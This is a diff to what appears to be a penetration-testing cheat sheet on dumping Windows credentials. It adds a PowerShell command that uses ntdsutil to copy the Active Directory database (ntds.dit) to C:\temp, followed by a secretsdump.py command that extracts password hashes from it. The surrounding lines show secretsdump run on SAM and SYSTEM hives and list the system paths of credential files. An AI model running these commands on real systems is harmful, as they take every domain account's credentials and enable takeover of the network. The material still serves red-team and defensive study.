@@ -83,3 +83,10 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
         - C:\Windows\NTDS\ntds.dit
         - C:\Windows\System32\config\SYSTEM
         - C:\Windows\System32\config\SECURITY
+    - with Powershell:
+    ```
+    #Dump
+    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+    #Extract
+    secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
+    ```
